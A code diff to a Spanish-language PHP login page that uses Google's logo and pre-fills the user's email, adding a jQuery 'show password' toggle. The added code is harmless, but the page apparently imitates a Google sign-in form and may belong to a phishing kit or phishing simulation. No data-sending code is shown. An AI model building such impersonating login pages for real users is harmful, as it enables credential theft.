@@ -25,9 +25,21 @@
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
         <h1>Te damos la Bienvenida</h1>
         <br>
+        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+    $('#muestrapassword').click(function(){
+        var defType = 'password';
+           if($('#muestrapassword').is(':checked')){
+            defType = 'text';
+        }
+        $('#inputpass').attr('type',defType);
+    });
+});
+</script>
         <input type="email" class="dropemail" name="username" image="http://www.w3.org/2000/svg" required value="<?php echo $username; ?>">
-        <input type="password" name="password" placeholder="Introduce tu contraseña" required>
-        <div class="checkboxpsswd"><input type="checkbox" class="checkboxpasswd" name="checkbox" placeholder="">Mostrar contraseña</div>
+        <input type="password" name="password" id="inputpass" placeholder="Introduce tu contraseña" required>
+        <div class="checkboxpsswd"><input type="checkbox" id="muestrapassword" class="checkboxpasswd" name="checkbox" placeholder="">Mostrar contraseña</div>
         <br>
         <br>
         <br>
